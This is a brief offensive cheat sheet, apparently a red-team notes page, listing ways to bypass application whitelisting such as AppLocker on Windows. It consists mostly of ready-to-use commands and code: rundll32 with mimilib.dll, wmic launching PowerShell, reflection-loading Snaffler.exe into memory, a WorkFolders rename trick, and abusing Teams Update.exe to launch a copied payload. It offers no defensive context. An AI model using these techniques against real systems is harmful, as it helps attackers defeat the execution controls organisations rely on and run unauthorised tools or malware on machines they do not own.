# Application Whitelisting Bypasses
## Random ones...
- Bypass Applocker with mimilib.dll to run arbitrary executables:  
  `rundll32 c:\path\mimilib.dll,start d:\otherpath\a.exe`  
- Run PowerShell.exe via wmic.exe:   
  `wmic.exe process call create "cmd /c powershell"` 
  
## PowerShell Assembly Reflection
```
# This technique can in some cases be used to bypass application whitelisting
# The following example runs the tool Snaffler.exe with the argument -s
[byte[]]$bytes = get-content -encoding byte -path C:\Users\username\Desktop\Snaffler.exe
$asm = [System.Reflection.Assembly]::Load($bytes)
$vars = New-Object System.Collections.Generic.List[System.Object]
$vars.Add("-s")
$passed = [string[]]$vars.ToArray()
$asm.EntryPoint.Invoke($null, @(,$passed))
```   
## Using WorkFolders
You can use the Workfolders application in Windows to run any binary in the current directory after renaming it to "control.exe":
![](screenshot.png)

## Using Teams Update.exe
Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied:   
`%userprofile%\AppData\Local\Microsoft\Teams\Update.exe --processStart payload.exe --process-start-args "whatever args"`   
